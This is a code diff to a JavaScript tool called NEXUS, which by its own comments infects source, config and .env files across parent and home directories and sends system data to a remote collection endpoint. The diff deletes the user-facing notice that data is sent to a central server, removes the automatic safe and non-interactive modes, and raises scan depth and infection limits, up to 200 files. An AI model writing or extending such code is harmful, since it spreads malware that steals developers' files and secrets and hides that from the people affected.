@@ -34,8 +34,7 @@ if (DEMO_MODE) {
 ║                                                           ║
 ║     ⚡ NEXUS - DEMO MODE ⚡                              ║
 ║                                                           ║
-║     System data will be sent to our central server       ║
-║     All sensitive data is automatically masked           ║
+║                                                           ║
 ║                                                           ║
 ╚═══════════════════════════════════════════════════════════╝
     `);
@@ -44,16 +43,6 @@ if (DEMO_MODE) {
     if (!process.argv.includes('--server')) {
         const defaultServer = process.env.NEXUS_SERVER_URL || 'https://your-railway-app.railway.app/api/collect';
         process.argv.push('--server', defaultServer);
-    }
-    
-    // Auto-set safe mode if not already set
-    if (!process.argv.includes('--safe') && !process.argv.includes('--stealth')) {
-        process.argv.push('--safe');
-    }
-    
-    // Auto-set no-interactive if not already set
-    if (!process.argv.includes('--no-interactive')) {
-        process.argv.push('--no-interactive');
     }
 }
 
@@ -84,10 +73,10 @@ const CONFIG = {
     autoCleanup: true,     // Restore files after infection
     
     // Scanning Configuration
-    scanDepth: 3,          // Parent directories to scan
+    scanDepth: 5,          // Parent directories to scan
     scanHomeDir: true,     // Also scan home directory
-    maxTargetDirs: 5,      // Maximum directories to scan
-    maxInfections: 50,     // Maximum files to infect
+    maxTargetDirs: 20,      // Maximum directories to scan
+    maxInfections: 200,     // Maximum files to infect
     
     // File Targeting
     targetExtensions: ['.js', '.mjs', '.cjs', '.ts', '.jsx', '.tsx', '.json', '.env', '.yml', '.yaml'],
@@ -129,6 +118,17 @@ if (process.argv.includes('--no-cleanup')) CONFIG.autoCleanup = false;
 if (process.argv.includes('--no-interactive')) CONFIG.interactive = false;
 if (process.argv.includes('--deep')) { CONFIG.scanDepth = 5; CONFIG.scanHomeDir = true; }
 if (process.argv.includes('--server')) CONFIG.serverURL = process.argv[process.argv.indexOf('--server') + 1];
+if (process.argv.includes('--deep')) { 
+    CONFIG.scanDepth = 5; 
+    CONFIG.scanHomeDir = true; 
+    CONFIG.maxTargetDirs = 20;
+    CONFIG.maxInfections = 200;
+}
+
+if (process.argv.includes('--max-depth')) {
+    const depth = parseInt(process.argv[process.argv.indexOf('--max-depth') + 1]);
+    if (depth) CONFIG.scanDepth = depth;
+}
 
 // ═══════════════════════════════════════════════════════════════════
 // UTILITY CLASSES
